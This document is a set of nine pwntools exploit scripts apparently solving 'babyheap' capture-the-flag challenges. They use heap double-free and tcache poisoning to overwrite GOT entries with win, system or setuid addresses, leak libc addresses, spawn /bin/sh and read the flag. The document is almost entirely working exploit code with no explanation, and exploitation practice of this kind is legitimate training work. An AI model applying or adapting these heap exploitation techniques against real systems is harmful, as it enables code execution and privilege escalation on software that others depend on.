CTF6 Shellcode

Challenge 1

```python
from pwn import *
from pwnlib.util.proc import wait_for_debugger
path = "/challenge/babyheap_level1"
elf = ELF(path)


def add(p, content, size=None):
  """
  scaffolding for communitcathing with the program
  """

  if not size:
    size = len(content)
  p.sendlineafter("Choice:", '1')
  p.sendlineafter("Size of the chunk?:", str(size))
  p.sendafter("Content:", content)
  line = p.recvregex("Chunk (\d+) is created")
  res = re.match(b"Chunk (\d+) is created", line)
  idx = int(res.group(1))
  return idx


def edit(p, idx, content):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '2')
  p.sendlineafter("Index:", str(idx))
  p.sendafter("New content:", content)
  p.recvuntil("updated successfully!")


def delete(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '3')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("deleted successfully!")


def show(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '4')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("is:")
  line = p.recvuntil("\n\n---")
  return line[:-5]


io = process(path)
add(io, "data", 0x80)
add(io, "data", 0x80)
delete(io, 0)
delete(io, 1)
edit(io, 1, p64(0x6020F0))
add(io, "data", 0x80)
add(io, "data", 0x80)
# wait_for_debugger(io.pid)

edit(io, 3, p64(0x0DEADBEEF))
io.interactive()
```

Challenge 2

```python
from pwn import *
from pwnlib.util.proc import wait_for_debugger
path = "/challenge/babyheap_level2"
elf = ELF(path)


def add(p, content, size=None):
  """
  scaffolding for communitcathing with the program
  """
  if not size:
    size = len(content)
  p.sendlineafter("Choice:", '1')
  p.sendlineafter("Size of the chunk?:", str(size))
  p.sendafter("Content:", content)
  line = p.recvregex("Chunk (\d+) is created")
  res = re.match(b"Chunk (\d+) is created", line)
  idx = int(res.group(1))
  return idx


def edit(p, idx, content):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '2')
  p.sendlineafter("Index:", str(idx))
  p.sendafter("New content:", content)
  p.recvuntil("updated successfully!")


def delete(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '3')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("deleted successfully!")


def show(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '4')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("is:")
  line = p.recvuntil("\n\n---")
  return line[:-5]


CHUNK_SIZE = 0x80
io = process(path)
add(io, "data", CHUNK_SIZE)
# add(io, "data", 0x80)
delete(io, 0)
delete(io, 0)
# add(io, p64(0x6020F0), CHUNK_SIZE)
delete(io, 0)
add(io, p64(0x6020F0), CHUNK_SIZE)
add(io, p64(0x6020F0), CHUNK_SIZE)
add(io, p64(0x0DEADBEEF), CHUNK_SIZE)
# io.interactive()
# wait_for_debugger(io.pid)
io.sendline("5")
io.interactive()

```

Challenge 3

```python
from pwn import *
from pwnlib.util.proc import wait_for_debugger
path = "/challenge/babyheap_level3"
elf = ELF(path)


def add(p, content, size=None):
  """
  scaffolding for communitcathing with the program
  """
  # BabyHeap CTF-3
  if not size:
    size = len(content)
  p.sendlineafter("Choice:", '1')
  p.sendlineafter("Size of the chunk?:", str(size))
  p.sendafter("Content:", content)
  line = p.recvregex("Chunk (\d+) is created")
  res = re.match(b"Chunk (\d+) is created", line)
  idx = int(res.group(1))
  return idx


def edit(p, idx, content):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '2')
  p.sendlineafter("Index:", str(idx))
  p.sendafter("New content:", content)
  p.recvuntil("updated successfully!")


def delete(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '3')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("deleted successfully!")


def show(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '4')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("is:")
  line = p.recvuntil("\n\n---")
  return line[:-5]


puts_got = elf.got['exit']
win_addr = elf.sym['win']
CHUNK_SIZE = 0x80
io = process(path)
add(io, "data", CHUNK_SIZE)
add(io, "data", CHUNK_SIZE)
delete(io, 1)
delete(io, 0)
add(io, cyclic(0xf0-0x60)+p64(puts_got), CHUNK_SIZE)
# io.interactive()
add(io, "data", CHUNK_SIZE)
add(io, p64(win_addr), CHUNK_SIZE)
# wait_for_debugger(io.pid)
io.sendline("5")
io.interactive()
```

Challenge 4

```python
from pwn import *
from pwnlib.util.proc import wait_for_debugger
path = "/challenge/babyheap_level4"
elf = ELF(path)


def add(p, content, size=None):
  """
  scaffolding for communitcathing with the program
  """
  # BabyHeap CTF-3
  if not size:
    size = len(content)
  p.sendlineafter("Choice:", '1')
  p.sendlineafter("Size of the chunk?:", str(size))
  p.sendafter("Content:", content)
  line = p.recvregex("Chunk (\d+) is created")
  res = re.match(b"Chunk (\d+) is created", line)
  idx = int(res.group(1))
  return idx


def edit(p, idx, content):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '2')
  p.sendlineafter("Index:", str(idx))
  p.sendafter("New content:", content)
  p.recvuntil("updated successfully!")


def delete(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '3')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("deleted successfully!")


def show(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '4')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("is:")
  line = p.recvuntil("\n\n---")
  return line[:-5]


exit_got = elf.got['exit']
win_addr = elf.sym['win']
CHUNK_SIZE = 0x80
io = process(path)
add(io, "data", CHUNK_SIZE)
# add(io, "data", 0x80)
delete(io, 0)
delete(io, 0)

# add(io, p64(0x6020F0), CHUNK_SIZE)
delete(io, 0)

add(io, p64(exit_got), CHUNK_SIZE)
add(io, p64(exit_got), CHUNK_SIZE)
# wait_for_debugger(io.pid)
add(io, p64(win_addr), CHUNK_SIZE)
# io.interactive()
io.sendline("5")
io.interactive()

```

Challenge 5

```python
from matplotlib.pyplot import waitforbuttonpress
from pwn import *
from pwnlib.util.proc import wait_for_debugger


def add(p, content, size=None):
  """
  scaffolding for communitcathing with the program
  """
  # BabyHeap CTF-3
  if not size:
    size = len(content)
  p.sendlineafter("Choice:", '1')
  p.sendlineafter("Size of the chunk?:", str(size))
  p.sendafter("Content:", content)
  line = p.recvregex("Chunk (\d+) is created")
  res = re.match(b"Chunk (\d+) is created", line)
  idx = int(res.group(1))
  return idx


def edit(p, idx, content):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '2')
  p.sendlineafter("Index:", str(idx))
  p.sendafter("New content:", content)
  p.recvuntil("updated successfully!")


def delete(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '3')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("deleted successfully!")


def show(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '4')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("is:")
  # line = p.recvuntil("END", drop=True)
  return


path = "/challenge/babyheap_level5"
elf = ELF(path)

libc = ELF("/lib/2.27-3ubuntu1.2_amd64/libc.so.6")
CHUNK_SIZE = 0x40
CHUNK_INDEX = 0
io = process(path)


def dword_shoot(io: process, target_addr, expect_value):
  global CHUNK_SIZE, CHUNK_INDEX
  add(io, "/bin/sh", CHUNK_SIZE)
  add(io, "chunk%d" % (CHUNK_INDEX+1), CHUNK_SIZE)
  delete(io, CHUNK_INDEX + 1)
  delete(io, CHUNK_INDEX)
  # wait_for_debugger(io.pid)
  # io.interactive()
  add(io, b"/bin/sh\x00"+cyclic(CHUNK_SIZE+0x10-8)+p64(target_addr), CHUNK_SIZE)
  add(io, "%23$pEND", CHUNK_SIZE)
  # wait_for_debugger(io.pid)
  add(io, p64(expect_value), CHUNK_SIZE)
  CHUNK_SIZE += 0x20
  CHUNK_INDEX += 3


dword_shoot(io, elf.got['puts'], elf.sym['printf'])
show(io, 1)
data = io.recvuntil("END", drop=True)
libc.address = int(data, 16)-0xe7 - libc.sym['__libc_start_main']

dword_shoot(io, elf.got['exit'], libc.sym['setuid'])

dword_shoot(io, elf.got['free'], libc.sym['system'])
binsh_addr = next(libc.search(b'/bin/sh'))
# wait_for_debugger(io.pid)
io.sendline('5')
io.recvuntil("Choice:")
io.recvuntil("Choice:")
io.sendline("3")
# print(data)
io.sendline("0")
io.sendline("cat /flag")
io.interactive()
# io.interactive()

```

Challenge 6

```python
#coding:utf-8

from pwn import *
import sys,os,string,base64

p = process('/challenge/babyheap_level6')

#P = ELF(elf_path)
context(os='linux',arch='amd64')
#context.terminal = ['terminator','-x','sh','-c']
context.terminal = ['tmux','split','-h']
#context.log_level = 'debug'
libc = ELF("/lib/2.27-3ubuntu1.2_amd64/libc.so.6")

def add(size,content):
	p.recvuntil('ce:')
	p.sendline(str(1))
	p.recvuntil('?:')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.send(content)

def show(idx):
	p.recvuntil('ce:')
	p.sendline(str(4))
	p.recvuntil(':')
	p.sendline(str(idx))

def delete(idx):
	p.recvuntil('ce:')
	p.sendline(str(3))
	p.recvuntil(':')
	p.sendline(str(idx))

def edit(idx,content):
	p.recvuntil('ce:')
	p.sendline(str(2))
	p.recvuntil(':')
	p.sendline(str(idx))
	p.recvuntil(':')
	p.send(content)

p.recvuntil('as gift: ')
libcbase = int(p.recvn(14),16)-libc.sym['puts']


add(0x100,'a'*0x60)
add(0x10,'/bin/sh\x00')
delete(0)
delete(0)

add(0x100,p64(0x602018))
add(0x100,'1')
payload = p64(libcbase+libc.sym['system'])
payload+= p64(libcbase+libc.sym['putchar'])
payload+= p64(libcbase+libc.sym['strlen'])
payload+= p64(libcbase+libc.sym['mmap'])
payload+= p64(libcbase+libc.sym['setbuf'])
payload+= p64(libcbase+libc.sym['printf'])
payload+= p64(libcbase+libc.sym['__assert_fail'])
payload+= p64(libcbase+libc.sym['memset'])
payload+= p64(libcbase+libc.sym['close'])
payload+= p64(libcbase+libc.sym['malloc_usable_size'])
payload+= p64(libcbase+libc.sym['read'])
payload+= p64(libcbase+libc.sym['malloc'])
payload+= p64(libcbase+libc.sym['mprotect'])
payload+= p64(libcbase+libc.sym['atoi'])
payload+= p64(libcbase+libc.sym['setuid'])
add(0x100,payload)

p.recvuntil('ce:')
p.sendline(str(5))

delete(1)

p.interactive()

```

Challenge 7

```python
#coding:utf-8

from pwn import *
import sys,os,string,base64

p = process('/challenge/babyheap_level7')

#P = ELF(elf_path)
context(os='linux',arch='amd64')
#context.terminal = ['terminator','-x','sh','-c']
context.terminal = ['tmux','split','-h']
#context.log_level = 'debug'
libc = ELF("/lib/2.27-3ubuntu1.2_amd64/libc.so.6")

def add(size,content):
	p.recvuntil('ce:')
	p.sendline(str(1))
	p.recvuntil('?:')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.send(content)

def show(idx):
	p.recvuntil('ce:')
	p.sendline(str(4))
	p.recvuntil(':')
	p.sendline(str(idx))

def delete(idx):
	p.recvuntil('ce:')
	p.sendline(str(3))
	p.recvuntil(':')
	p.sendline(str(idx))


p.recvuntil('as gift: ')
libcbase = int(p.recvn(14),16)-libc.sym['puts']
log.success('libcbase = '+hex(libcbase))

for i in range(9):
	add(0x70,'a')

for i in range(7):
	delete(i)

delete(7)
delete(8)
delete(7)

for i in range(7):
	add(0x70,'b')

add(0x70,p64(0x602018))

add(0x70,'/bin/sh\x00')
add(0x70,'/bin/sh\x00')
add(0x10,'/bin/sh\x00')

payload = p64(libcbase+libc.sym['system'])
payload+= p64(libcbase+libc.sym['putchar'])
payload+= p64(libcbase+libc.sym['strlen'])
payload+= p64(libcbase+libc.sym['mmap'])
payload+= p64(libcbase+libc.sym['setbuf'])
payload+= p64(libcbase+libc.sym['printf'])
payload+= p64(libcbase+libc.sym['__assert_fail'])
payload+= p64(libcbase+libc.sym['memset'])
payload+= p64(libcbase+libc.sym['close'])
payload+= p64(libcbase+libc.sym['read'])
payload+= p64(libcbase+libc.sym['malloc'])
payload+= p64(libcbase+libc.sym['mprotect'])
payload+= p64(libcbase+libc.sym['atoi'])
payload+= p64(libcbase+libc.sym['setuid'])
add(0x70,payload)

p.recvuntil('ce:')
p.sendline(str(5))

#gdb.attach(p)

delete(10)

p.interactive()

```

Challenge 8

```python
#coding:utf-8

from pwn import *
import sys,os,string,base64

p = process('/challenge/babyheap_level8')

#P = ELF(elf_path)
context(os='linux',arch='amd64')
#context.terminal = ['terminator','-x','sh','-c']
context.terminal = ['tmux','split','-h']
#context.log_level = 'debug'
libc = ELF("/lib/2.27-3ubuntu1.2_amd64/libc.so.6")

def add(size,content):
	p.recvuntil('ce:')
	p.sendline(str(1))
	p.recvuntil('?:')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.send(content)

def show(idx):
	p.recvuntil('ce:')
	p.sendline(str(4))
	p.recvuntil(':')
	p.sendline(str(idx))

def delete(idx):
	p.recvuntil('ce:')
	p.sendline(str(3))
	p.recvuntil(':')
	p.sendline(str(idx))

def edit(idx,content):
	p.recvuntil('ce:')
	p.sendline(str(2))
	p.recvuntil(':')
	p.sendline(str(idx))
	p.recvuntil(':')
	p.send(content)

for i in range(9):
	add(0x80,'a')

for i in range(8):
	delete(i)

show(7)
p.recvuntil(' is:')
libcbase = u64(p.recvn(6).ljust(8,b'\x00'))-88-libc.sym['__malloc_hook']-0x18
log.success('libcbase = '+hex(libcbase))

for i in range(11):
	add(0x70,'a')

for i in range(9):
	delete(i+8)

delete(18)
delete(19)
delete(18)

for i in range(7):
	add(0x70,'b')

add(0x70,p64(0x602028)) #27
add(0x70,'1')
add(0x70,'1')

payload = p64(libcbase+libc.sym['puts'])
payload+= p64(libcbase+libc.sym['strlen'])
payload+= p64(libcbase+libc.sym['mmap'])
payload+= p64(libcbase+libc.sym['setbuf'])
payload+= p64(libcbase+libc.sym['printf'])
payload+= p64(libcbase+libc.sym['__assert_fail'])
payload+= p64(libcbase+libc.sym['memset'])
payload+= p64(libcbase+libc.sym['close'])
payload+= p64(libcbase+libc.sym['system'])
payload+= p64(libcbase+libc.sym['read'])
payload+= p64(libcbase+libc.sym['malloc'])
payload+= p64(libcbase+libc.sym['mprotect'])
payload+= p64(libcbase+libc.sym['atoi'])
payload+= p64(libcbase+libc.sym['setuid'])
add(0x70,payload)

add(0x10,b'/bin/sh\x00')

p.recvuntil('ce:')
p.sendline(str(5))

p.recvuntil('ce:')
p.sendline(str(2))
p.recvuntil(':')
p.sendline(str(31))


p.interactive()

```

Challenge 9

```python
#coding:utf-8

from pwn import *
import sys,os,string,base64

p = process('/challenge/babyheap_level9')

#P = ELF(elf_path)
context(os='linux',arch='amd64')
#context.terminal = ['terminator','-x','sh','-c']
context.terminal = ['tmux','split','-h']
#context.log_level = 'debug'
libc = ELF("/lib/2.27-3ubuntu1.2_amd64/libc.so.6")

def add(size,content):
	p.recvuntil('ce:')
	p.sendline(str(1))
	p.recvuntil('?:')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.send(content)

def show(idx):
	p.recvuntil('ce:')
	p.sendline(str(4))
	p.recvuntil(':')
	p.sendline(str(idx))

def delete(idx):
	p.recvuntil('ce:')
	p.sendline(str(3))
	p.recvuntil(':')
	p.sendline(str(idx))

def edit(idx,content):
	p.recvuntil('ce:')
	p.sendline(str(2))
	p.recvuntil(':')
	p.sendline(str(idx))
	p.recvuntil(':')
	p.send(content)

for i in range(9):
	add(0x80,'a')

for i in range(8):
	delete(i)

show(7)
p.recvuntil(' is:')
libcbase = u64(p.recvn(6).ljust(8,b'\x00'))-88-libc.sym['__malloc_hook']-0x18
log.success('libcbase = '+hex(libcbase))

for i in range(11):
	add(0x70,'a')

for i in range(7):
	delete(1+i)

delete(10)
delete(11)
delete(10)

for i in range(7):
	add(0x70,'b')

add(0x70,p64(0x602018))
add(0x70,'1')
add(0x70,'1')

payload = p64(libcbase+libc.sym['system'])
payload+= p64(libcbase+libc.sym['putchar'])
payload+= p64(libcbase+libc.sym['puts'])
payload+= p64(libcbase+libc.sym['strlen'])
payload+= p64(libcbase+libc.sym['mmap'])
payload+= p64(libcbase+libc.sym['setbuf'])
payload+= p64(libcbase+libc.sym['printf'])
payload+= p64(libcbase+libc.sym['__assert_fail'])
payload+= p64(libcbase+libc.sym['memset'])
payload+= p64(libcbase+libc.sym['close'])
payload+= p64(libcbase+libc.sym['read'])
payload+= p64(libcbase+libc.sym['malloc'])
payload+= p64(libcbase+libc.sym['mprotect'])
payload+= p64(libcbase+libc.sym['atoi'])
payload+= p64(libcbase+libc.sym['setuid'])
add(0x78,payload)

add(0x10,b'/bin/sh\x00')

p.recvuntil('ce:')
p.sendline(str(5))

#gdb.attach(p)
delete(14)

p.interactive()

```